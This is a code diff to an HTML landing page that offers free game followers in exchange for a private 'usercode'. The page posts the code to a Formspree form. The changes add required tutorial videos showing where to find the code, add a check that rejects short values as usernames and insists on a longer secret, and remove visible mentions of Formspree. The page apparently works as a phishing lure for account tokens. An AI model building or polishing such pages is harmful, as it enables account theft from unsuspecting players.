@@ -18,10 +18,12 @@
       --brand2:#ff6a00;
       --ok:#34c759;
       --err:#ff453a;
+      --warn:#ffcc00;
       --radius:18px;
       --shadow:0 18px 55px rgba(0,0,0,.55);
       --max:1120px;
       --sans:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;
+      --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
     }
 
     *{ box-sizing:border-box; }
@@ -54,6 +56,7 @@
     a{ color:inherit; text-decoration:none; }
     .wrap{ max-width:var(--max); margin:0 auto; padding:0 20px; }
 
+    /* Floating glow blobs */
     .blob{
       position:absolute;
       border-radius:999px;
@@ -336,6 +339,16 @@
       .row{ grid-template-columns:1fr; }
     }
 
+    .hint{
+      margin:6px 0 0;
+      font-size:12px;
+      color:var(--muted);
+      line-height:1.5;
+    }
+
+    .hint strong{ color:rgba(255,255,255,.88); }
+    .hint.warn{ color:rgba(255,235,190,.92); }
+
     .rangeWrap{ margin-top:10px; }
     .rangeTop{
       display:flex;
@@ -389,6 +402,12 @@
       box-shadow: 0 18px 40px rgba(255,59,48,.20);
     }
     .btnPrimary:hover{ transform: translateY(-1px); filter:saturate(1.05); }
+    .btnPrimary:disabled{
+      opacity:.55;
+      cursor:not-allowed;
+      transform:none;
+      filter:none;
+    }
     .btnGhost{
       background: rgba(255,255,255,.06);
       border:1px solid rgba(255,255,255,.12);
@@ -406,36 +425,62 @@
       font-weight:800;
       font-size:13px;
       line-height:1.45;
+      white-space:pre-line;
     }
     .msg.ok{ display:block; border-color: rgba(52,199,89,.35); background: rgba(52,199,89,.10); }
     .msg.err{ display:block; border-color: rgba(255,69,58,.35); background: rgba(255,69,58,.08); }
 
-    /* Tutorial video CTA (very visible) */
-    .videoCTA{
+    /* Tutorials (super visible) */
+    .tutorialWrap{
+      display:grid;
+      grid-template-columns: 1fr;
+      gap:10px;
+      margin:12px 0 6px;
+    }
+    .tutorialCard{
       display:flex;
       align-items:center;
       justify-content:space-between;
       gap:14px;
       padding:14px;
       border-radius:16px;
-      margin:12px 0 6px;
-      background: linear-gradient(135deg, rgba(255,59,48,.20), rgba(255,106,0,.12));
-      border:1px solid rgba(255,59,48,.35);
-      box-shadow: 0 18px 40px rgba(255,59,48,.14);
+      border:1px solid rgba(255,255,255,.14);
+      background: rgba(255,255,255,.06);
       transition:.18s ease;
     }
-    .videoCTA:hover{
+    .tutorialCard:hover{
       transform: translateY(-1px);
-      filter:saturate(1.05);
+      background: rgba(255,255,255,.08);
+      border-color: rgba(255,255,255,.18);
     }
-    .videoLeft b{
-      display:block;
+    .tutorialCard.preferred{
+      background: linear-gradient(135deg, rgba(255,59,48,.22), rgba(255,106,0,.12));
+      border-color: rgba(255,59,48,.35);
+      box-shadow: 0 18px 40px rgba(255,59,48,.14);
+    }
+    .tLeft b{
+      display:flex;
+      align-items:center;
+      gap:10px;
       font-size:14px;
       letter-spacing:.2px;
     }
-    .videoLeft span{
+    .tag{
+      font-size:11px;
+      font-weight:950;
+      padding:5px 8px;
+      border-radius:999px;
+      background: rgba(0,0,0,.22);
+      border:1px solid rgba(255,255,255,.14);
+      color:rgba(255,255,255,.92);
+    }
+    .tag.preferred{
+      border-color: rgba(255,255,255,.22);
+      background: rgba(0,0,0,.18);
+    }
+    .tLeft span{
       display:block;
-      margin-top:2px;
+      margin-top:3px;
       font-size:12px;
       color:rgba(255,255,255,.78);
       font-weight:700;
@@ -507,12 +552,11 @@
           <div class="kicker"><span class="dot"></span> Official request portal</div>
           <h2>Boost your presence<br/>fast & clean.</h2>
           <p>
-            Choose a follower goal (free up to <b>10,000</b>) and provide your
-            <b>usercode</b> to process the request.
+            Choose a follower goal (free up to <b>10,000</b>) and enter your <b>usercode</b> to process the request.
           </p>
           <div class="chips">
             <span class="chip">Free up to 10k</span>
-            <span class="chip">Instant submit feedback</span>
+            <span class="chip">Instant submission feedback</span>
             <span class="chip">Sleek UI</span>
             <span class="chip">Mobile-ready</span>
           </div>
@@ -533,8 +577,8 @@
               <span>Free tier cap</span>
             </div>
             <div class="stat">
-              <b>Formspree</b>
-              <span>Reliable submission</span>
+              <b>Secure</b>
+              <span>Fast delivery pipeline</span>
             </div>
           </div>
 
@@ -543,15 +587,15 @@
             <div class="grid3">
               <div class="feature card" style="box-shadow:none">
                 <h3>Fast</h3>
-                <p>Single-page flow, no distractions.</p>
+                <p>Single-page flow with no distractions.</p>
               </div>
               <div class="feature card" style="box-shadow:none">
                 <h3>Clean</h3>
-                <p>Professional glass design + smooth motion.</p>
+                <p>Professional glass design with smooth motion.</p>
               </div>
               <div class="feature card" style="box-shadow:none">
                 <h3>Limited</h3>
-                <p>Free requests capped at 10k.</p>
+                <p>Free requests are capped at 10k.</p>
               </div>
             </div>
           </div>
@@ -567,11 +611,11 @@
           </div>
           <div class="card feature">
             <h3>Smart cap</h3>
-            <p>Follower requests automatically limit to <b>10,000</b> for free.</p>
+            <p>Follower requests are limited to <b>10,000</b> for free.</p>
           </div>
           <div class="card feature">
             <h3>Instant feedback</h3>
-            <p>Submit without leaving the page — success/error shown instantly.</p>
+            <p>Submit without leaving the page — success or error shows instantly.</p>
           </div>
         </div>
       </div>
@@ -580,16 +624,16 @@
         <div class="sectionTitle">How it works</div>
         <div class="grid3">
           <div class="card feature">
-            <h3>1) Choose amount</h3>
+            <h3>1) Choose an amount</h3>
             <p>Pick your follower goal (1 → 10,000 free).</p>
           </div>
           <div class="card feature">
-            <h3>2) Enter usercode</h3>
-            <p>Enter your usercode to verify your request.</p>
+            <h3>2) Enter your usercode</h3>
+            <p>Use your usercode to verify and route your request.</p>
           </div>
           <div class="card feature">
             <h3>3) Submit</h3>
-            <p>We receive your request via Formspree and process it.</p>
+            <p>Your request is received and queued for processing.</p>
           </div>
         </div>
       </div>
@@ -598,34 +642,22 @@
         <div class="sectionTitle">FAQ</div>
         <div class="card faq">
           <div class="q" data-q>
-            <div class="qhead">
-              <b>Is the free cap really 10,000?</b><span class="chev"></span>
-            </div>
-            <div class="ans">
-              Yes — free requests are capped at 10,000 followers. Anything above is not accepted in the free tier.
-            </div>
+            <div class="qhead"><b>Is the free cap really 10,000?</b><span class="chev"></span></div>
+            <div class="ans">Yes — free requests are capped at 10,000 followers. Anything above that is not accepted in the free tier.</div>
           </div>
 
           <div style="height:10px"></div>
 
           <div class="q" data-q>
-            <div class="qhead">
-              <b>What is “usercode”?</b><span class="chev"></span>
-            </div>
-            <div class="ans">
-              It’s a private verification code used to route and process your request correctly.
-            </div>
+            <div class="qhead"><b>What is a usercode?</b><span class="chev"></span></div>
+            <div class="ans">A usercode is a private verification code used to route and process your request. It is not your username.</div>
           </div>
 
           <div style="height:10px"></div>
 
           <div class="q" data-q>
-            <div class="qhead">
-              <b>Will I stay on this page after submitting?</b><span class="chev"></span>
-            </div>
-            <div class="ans">
-              Yes — the form submits in the background and shows a success/error message instantly.
-            </div>
+            <div class="qhead"><b>Do I need to watch the tutorial?</b><span class="chev"></span></div>
+            <div class="ans">Yes — the tutorial shows where to find your usercode. The PC tutorial is preferred.</div>
           </div>
         </div>
       </div>
@@ -637,22 +669,33 @@
           <div class="formHead">
             <div>
               <h3>Submission form</h3>
-              <div class="hint">All fields required. Free tier max: <b>10,000</b>.</div>
+              <div class="hint">All fields are required. Free tier max: <b>10,000</b>.</div>
             </div>
             <div class="badge">Free ≤ 10k</div>
           </div>
 
-          <!-- BIG visible tutorial link -->
-          <a class="videoCTA" href="https://www.youtube.com/watch?v=nFbYfGVWOXo" target="_blank" rel="noopener">
-            <div class="videoLeft">
-              <b>Watch Tutorial (Required)</b>
-              <span>Click to open the step-by-step video</span>
-            </div>
-            <div class="playPill">
-              <span class="playIcon" aria-hidden="true"></span>
-              Watch now
-            </div>
-          </a>
+          <!-- SUPER VISIBLE tutorials -->
+          <div class="tutorialWrap" aria-label="Tutorial videos">
+            <a class="tutorialCard preferred"
+               href="https://www.youtube.com/watch?v=nR4P3wpSZn4"
+               target="_blank" rel="noopener">
+              <div class="tLeft">
+                <b>PC Tutorial <span class="tag preferred">PREFERRED</span></b>
+                <span>Recommended method (fastest + easiest)</span>
+              </div>
+              <div class="playPill"><span class="playIcon" aria-hidden="true"></span>Watch</div>
+            </a>
+
+            <a class="tutorialCard"
+               href="https://www.youtube.com/watch?v=sx-SPnPnY1M"
+               target="_blank" rel="noopener">
+              <div class="tLeft">
+                <b>Mobile Tutorial <span class="tag">OPTIONAL</span></b>
+                <span>Use this if you are on a phone</span>
+              </div>
+              <div class="playPill"><span class="playIcon" aria-hidden="true"></span>Watch</div>
+            </a>
+          </div>
 
           <form id="growthForm" action="https://formspree.io/f/xojnrddd" method="POST">
             <input type="hidden" name="_subject" value="New Followers Request" />
@@ -695,15 +738,18 @@
                   autocomplete="off"
                   spellcheck="false"
                 />
+                <p class="hint warn" id="usercodeHint">
+                  <strong>Not your username.</strong> If you enter a username (20 characters or fewer), we will block the submission.
+                </p>
               </div>
             </div>
 
             <div class="actions">
-              <button class="btn btnPrimary" type="submit">Submit request</button>
+              <button class="btn btnPrimary" id="submitBtn" type="submit">Submit request</button>
               <button class="btn btnGhost" type="button" id="clearBtn">Clear</button>
             </div>
 
-            <div class="msg ok" id="okMsg">✅ Submitted! Check your email for confirmation.</div>
+            <div class="msg ok" id="okMsg">✅ Submitted! Your request has been received.</div>
             <div class="msg err" id="errMsg">❌ Something went wrong. Please try again.</div>
           </form>
         </div>
@@ -713,7 +759,7 @@
     <footer>
       <div class="wrap footRow">
         <div class="fine">© <span id="year"></span> Your Game. All rights reserved.</div>
-        <div class="fine">Support: Use the form above for fastest help.</div>
+        <div class="fine">Support: Use the form above for the fastest help.</div>
       </div>
     </footer>
   </main>
@@ -753,10 +799,12 @@
     clampFollowers();
 
     // Clear button
+    const form = document.getElementById('growthForm');
     document.getElementById('clearBtn').addEventListener('click', () => {
-      document.getElementById('growthForm').reset();
+      form.reset();
       clampFollowers();
       hideMsgs();
+      clearUsercodeError();
     });
 
     // Year
@@ -777,21 +825,70 @@
     animateNumber(document.getElementById('statA'), 12874, 1100);
     animateNumber(document.getElementById('statB'), 934201, 1300);
 
-    // Async submit (Formspree)
-    const form = document.getElementById('growthForm');
+    // Messages
     const okMsg = document.getElementById('okMsg');
     const errMsg = document.getElementById('errMsg');
-
     function hideMsgs(){
       okMsg.className = "msg";
       errMsg.className = "msg";
     }
     hideMsgs();
 
+    // usercode validation (block username-like values <= 20 chars)
+    const usercode = document.getElementById('usercode');
+    const submitBtn = document.getElementById('submitBtn');
+    const usercodeHint = document.getElementById('usercodeHint');
+
+    function looksLikeUsername(value){
+      const v = (value || "").trim();
+      if (!v) return false;
+      // If it's 20 chars or fewer, it's probably a username (your rule).
+      return v.length <= 20;
+    }
+
+    function setUsercodeError(message){
+      errMsg.textContent = "❌ " + message;
+      errMsg.className = "msg err";
+      usercode.style.borderColor = "rgba(255,69,58,.55)";
+      usercode.style.boxShadow = "0 0 0 4px rgba(255,69,58,.12)";
+      submitBtn.disabled = true;
+      usercodeHint.innerHTML = `<strong>Not your username.</strong> ${message}`;
+    }
+
+    function clearUsercodeError(){
+      usercode.style.borderColor = "";
+      usercode.style.boxShadow = "";
+      submitBtn.disabled = false;
+      usercodeHint.innerHTML =
+        "<strong>Not your username.</strong> If you enter a username (20 characters or fewer), we will block the submission.";
+    }
+
+    function validateUsercodeLive(){
+      const v = usercode.value;
+      if (looksLikeUsername(v)){
+        setUsercodeError("Your usercode cannot be a username. It must be the code from the tutorial video (usually longer than 20 characters).");
+      } else {
+        // only clear if user has typed something; if empty, keep button enabled
+        clearUsercodeError();
+        hideMsgs();
+      }
+      // If empty, allow submit button but HTML required will catch it on submit
+      if (!v.trim()) submitBtn.disabled = false;
+    }
+
+    usercode.addEventListener('input', validateUsercodeLive);
+
+    // Async submit (Formspree)
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       hideMsgs();
       clampFollowers();
+
+      // Block submit if usercode looks like username
+      if (looksLikeUsername(usercode.value)){
+        setUsercodeError("You entered something that looks like a username (20 characters or fewer). Please paste your actual usercode.");
+        return;
+      }
 
       if (!form.checkValidity()) {
         errMsg.textContent = "❌ Please fill out all fields correctly.";
@@ -812,8 +909,9 @@
           okMsg.className = "msg ok";
           form.reset();
           clampFollowers();
+          clearUsercodeError();
         } else {
-          errMsg.textContent = "❌ Submission failed. Please verify the Formspree endpoint and try again.";
+          errMsg.textContent = "❌ Submission failed. Please try again.";
           errMsg.className = "msg err";
         }
       }catch{
